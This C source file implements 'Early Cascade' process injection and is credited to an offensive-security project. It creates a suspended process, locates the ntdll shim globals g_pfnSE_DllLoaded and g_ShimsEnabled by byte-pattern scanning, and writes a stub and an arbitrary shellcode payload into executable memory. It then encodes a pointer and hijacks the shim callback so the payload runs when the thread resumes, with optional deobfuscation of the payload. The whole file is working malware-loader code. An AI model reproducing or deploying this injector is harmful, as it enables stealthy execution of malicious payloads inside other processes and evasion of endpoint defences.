/* Credits 0xNinjaCyclone: https://github.com/0xNinjaCyclone/EarlyCascade */
#include "injectors.h"
#include "../../config.h"


LPBYTE g_pfnSE_DllLoaded_opcodes = "\x8B\x14\x25\x30\x03\xFE\x7F\x8B\xC2\x48\x8B\x3D";
SIZE_T g_pfnSE_DllLoaded_opcodes_size = 12;

LPBYTE g_ShimsEnabled_opcodes = "\xc6\x05";
SIZE_T g_ShimsEnabled_opcodes_size = 2;

PVOID find_g_pfnSE_DllLoaded_Address(HANDLE hNtdll, PVOID* pSE_DllLoaded) {
    PVOID pDllLoaded = NULL;

    // Search in .text section where g_pfnSE_DllLoaded is typically located
    PVOID pTextSection = GetSectionAddress(hNtdll, ".text", NULL);
    if (!pTextSection) {
        DebugPrint("[!] Failed to get .data section address\n");
        goto _EndOfFunc;
    }
    DebugPrint("[+] NtDLL .text section Base Address = 0x%p\n", pTextSection);

    // Search in .mrdata section where g_pfnSE_DllLoaded is typically located
    PVOID pMrDataSection = GetSectionAddress(hNtdll, ".mrdata", NULL);
    if (!pMrDataSection) {
        DebugPrint("[!] Failed to get .data section address\n");
        goto _EndOfFunc;
    }
    DebugPrint("[+] NtDLL .mrdata section Base Address = 0x%p\n", pMrDataSection);

    // Pattern for finding g_pfnSE_DllLoaded reference
    const BYTE pattern[] = {
        0x8B,0x14,0x25,0x30,0x03,0xFE,0x7F, // mov edx, dword ptr [7FFE0330h]  (platform dep)
        0x8B,0xC2,                         // mov eax, edx
        0x48,0x8B,0x3D                    // mov rdi, qword ptr [rip + disp32]  (disp32 follows)
    };
    const SIZE_T patternLen = sizeof(pattern);
    LPBYTE pMatch = find_asm_pattern(pattern, patternLen, (LPBYTE)pTextSection, 0, 0x100000);

    if (!pMatch) {
        DebugPrint("[!] Failed to find g_pfnSE_DllLoaded pattern\n");
        goto _EndOfFunc;
    }

    // Extract the RIP-relative pointer from the instruction
    LPBYTE pDisp = pMatch + patternLen;      // points to disp32
    INT32 disp32 = *(INT32*)pDisp;           // signed displacement
    *pSE_DllLoaded = (PVOID)((ULONG_PTR)(pDisp + 4) + disp32);

    return pMatch;

_EndOfFunc:
    DebugPrint("[!] Failed to find g_pfnSE_DllLoaded\n");
    return NULL;
}


PVOID find_g_ShimsEnabled(HMODULE hNtdll, PVOID pSE_DllLoaded) {
    BOOL bResult = FALSE;
    PVOID pDataSection = NULL;
    LPBYTE pMatch = NULL;
    PVOID pShimsEnabled = NULL;

    // Search for g_ShimsEnabled in .data section
    pDataSection = GetSectionAddress(hNtdll, ".data", NULL);
    if (!pDataSection) {
        DebugPrint("[!] Failed to get .data section address\n");
        goto _EndOfFunc;
    }

    // Pattern for finding g_ShimsEnabled reference (mov byte ptr [rip+disp32], 1)
    BYTE pattern[] = { 0xC6, 0x05 };
    pMatch = find_asm_pattern(pattern, sizeof(pattern), (PBYTE)pSE_DllLoaded, 0xFF, 0xFF);

    if (!pMatch) {
        DebugPrint("[!] Failed to find g_ShimsEnabled pattern\n");
        goto _EndOfFunc;
    }

    // Calculate the absolute address from the RIP-relative displacement
    INT32 disp32 = *(INT32*)(pMatch + 2);              // signed displacement
    int imm8Size = 1;
    pShimsEnabled = (PVOID)((ULONG_PTR)(pMatch + 6 + imm8Size) + disp32);

_EndOfFunc:
    return pShimsEnabled;
}


LPVOID encode_system_ptr(LPVOID ptr) {
    // get pointer cookie from SharedUserData!Cookie (0x330)
    ULONG cookie = *(ULONG*)0x7FFE0330;

    // encrypt our pointer so it'll work when written to ntdll
    return (LPVOID)_rotr64(cookie ^ (ULONGLONG)ptr, cookie & 0x3F);
}


BOOL EarlyCascadeInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName, PBYTE pPayload, SIZE_T sPayloadSize) {
    HMODULE hNtdll = NULL;
    BOOL bSuccess = FALSE;
    BOOL bEnable = TRUE;
    PVOID pSE_DllLoaded = NULL;
    PVOID pShimsEnabled = NULL;
    PVOID pStubAddress = NULL;
    PVOID pShellcodeAddress = NULL;

    BYTE stubPlaceholder[8] = { 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11 };
    PBYTE pStubShellcode = (PBYTE)CascadeStub;
    SIZE_T stubShellcodeSize = CascadeStubSize;
#if defined(OBFUSCATED_PAYLOAD)
    bSuccess = deobfuscate(CascadeStub, CascadeStubSize, &pStubShellcode, &stubShellcodeSize);
    if (!bSuccess) {
        DebugPrint("[!] Failed to deobfuscate payload\n");
        goto cleanup;
    }
#endif

    DebugPrint("[i] Starting Early Cascade Injection...\n");

    hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        DebugPrint("[!] Failed to get ntdll handle\n");
        return FALSE;
    }
    DebugPrint("[+] NtDLL Base Address = 0x%p\n", hNtdll);

    // Start a suspended process and get a handle on it
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateSuspendedProcess(szProcessName, &pi, NULL, NULL)) {
        DebugPrint("[!] Failed to create suspended process: %d\n", GetLastError());
        goto cleanup;
    }
    DebugPrint("[+] Created suspended process: %p\n", pi.hProcess);

    // 1. Find g_pfnSE_DllLoaded address in the target process
    DebugPrint("[i] Locating g_pfnSE_DllLoaded...\n");
    PVOID pSE_DllLoaded_Pattern = find_g_pfnSE_DllLoaded_Address(hNtdll, &pSE_DllLoaded);
    if (!pSE_DllLoaded) {
        DebugPrint("[!] Failed to find g_pfnSE_DllLoaded\n");
        goto cleanup;
    }
    pSE_DllLoaded_Pattern = (PBYTE)pSE_DllLoaded_Pattern + 0xc;
    DebugPrint("[+] Found g_pfnSE_DllLoaded pattern at: 0x%p\n", pSE_DllLoaded_Pattern);
    DebugPrint("[+] Found g_pfnSE_DllLoaded at: 0x%p\n", pSE_DllLoaded);

    // 2. Find and enable g_ShimsEnabled
    DebugPrint("[i] Locating g_ShimsEnabled...\n");
    pShimsEnabled = find_g_ShimsEnabled(hNtdll, pSE_DllLoaded_Pattern);
    if (!pShimsEnabled) {
        DebugPrint("[!] Failed to enable g_ShimsEnabled\n");
        goto cleanup;
    }
    DebugPrint("[+] Found g_ShimsEnabled at: %p\n", pShimsEnabled);

    DebugPrint("[i] Allocating memory for stub & shellcode\n");
    pStubAddress = VirtualAllocEx(pi.hProcess, NULL, CascadeStubSize + sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pStubAddress) {
        DebugPrint("[!] Failed to allocate memory\n");
        goto cleanup;
    }

    pShellcodeAddress = (PVOID)((PBYTE)pStubAddress + CascadeStubSize);
    DebugPrint("[i] stub will be injected at 0x%p\n", pStubAddress);
    DebugPrint("[i] shellcode will be injected at 0x%p\n", pShellcodeAddress);


    PVOID pStubPlaceholder = find_asm_pattern(stubPlaceholder, sizeof(stubPlaceholder), (LPBYTE)CascadeStub, 0, CascadeStubSize);
    _memcpy(pStubPlaceholder, &pShimsEnabled, sizeof(LPVOID));

    if (!WriteProcessMemory(pi.hProcess, pStubAddress, CascadeStub, CascadeStubSize, NULL)) {
        DebugPrint("[!] Failed to write shellcode\n");
        goto cleanup;
    }

    if (!WriteProcessMemory(pi.hProcess, pShellcodeAddress, pPayload, sPayloadSize, NULL)) {
        DebugPrint("[!] Failed to write shellcode\n");
        goto cleanup;
    }
    DebugPrint("[i] stub & shellcode successfully injected...\n");

    pStubAddress = encode_system_ptr((LPVOID)pStubAddress);
    DebugPrint("[i] The Callback Address has been encoded to 0x%p\n", pStubAddress);

    DebugPrint("[i] Hijacking g_pfnSE_DllLoaded to execute the stub\n");
    if (!WriteProcessMemory(pi.hProcess, pSE_DllLoaded, (LPCVOID)&pStubAddress, sizeof(LPVOID), NULL)) {
        DebugPrint("[!] Failed to hijack the callback\n");
        goto cleanup;
    }

    DebugPrint("[i] Enabling g_ShimsEnabled to trigger g_pfnSE_DllLoaded\n");
    if (!WriteProcessMemory(pi.hProcess, pShimsEnabled, (LPCVOID)&bEnable, sizeof(BOOL), NULL)) {
        DebugPrint("[!] Failed to enable g_ShimsEnabled\n");
        goto cleanup;
    }

    DebugPrint("[i] Setup successfull...\n");

    DebugPrint("[i] Resuming suspended process\n");
    if (!ResumeThread(pi.hThread)) {
        DebugPrint("[!] Failed to resume process\n");
        goto cleanup;
    }

    DebugPrint("[+] Early Cascade Injection completed successfully!\n");
    bSuccess = TRUE;

cleanup:
    if (!bSuccess) {
        if (pStubAddress) {
            VirtualFreeEx(hProcess, pStubAddress, 0, MEM_RELEASE);
        }
    }

    return bSuccess;
}